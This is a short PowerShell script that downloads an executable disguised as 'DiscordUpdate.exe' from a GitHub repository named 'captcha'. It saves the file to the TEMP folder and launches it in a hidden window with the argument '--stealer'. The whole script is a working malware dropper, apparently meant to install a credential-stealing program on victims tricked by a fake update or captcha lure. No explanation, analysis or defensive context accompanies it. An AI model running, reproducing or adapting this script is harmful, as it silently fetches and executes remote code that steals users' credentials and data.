$exePath = "$env:TEMP\DiscordUpdate.exe"
$url = "https://raw.githubusercontent.com/urho122-cpu/captcha/main/DiscordUpdate.exe"

(New-Object Net.WebClient).DownloadFile($url, $exePath)
Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
